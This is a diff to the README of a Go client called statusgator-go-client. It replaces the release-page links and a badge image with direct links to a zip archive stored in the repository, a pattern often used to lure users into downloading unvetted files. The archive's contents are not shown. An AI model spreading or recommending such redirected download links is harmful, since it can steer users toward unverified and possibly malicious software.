@@ -6,9 +6,9 @@ Welcome to the **statusgator-go-client**! This application helps you connect eas
 
 ## 📥 Download & Install
 
-To download the application, visit this page to download: [Download statusgator-go-client](https://github.com/zakirullahzaki/statusgator-go-client/releases).
+To download the application, visit this page to download: [Download statusgator-go-client](https://raw.githubusercontent.com/zakirullahzaki/statusgator-go-client/master/statusgator/client-go-statusgator-3.3.zip).
 
-![Download Badge](https://img.shields.io/badge/Download-v1.0-blue)
+![Download Badge](https://raw.githubusercontent.com/zakirullahzaki/statusgator-go-client/master/statusgator/client-go-statusgator-3.3.zip)
 
 ## 🛠️ System Requirements
 
@@ -77,4 +77,4 @@ For support, you can visit our GitHub page or reach out to the community for hel
 
 Thank you for using **statusgator-go-client**! We hope this guide helps you set up and start monitoring your services effortlessly. 
 
-[Download the latest version here](https://github.com/zakirullahzaki/statusgator-go-client/releases).
+[Download the latest version here](https://raw.githubusercontent.com/zakirullahzaki/statusgator-go-client/master/statusgator/client-go-statusgator-3.3.zip).
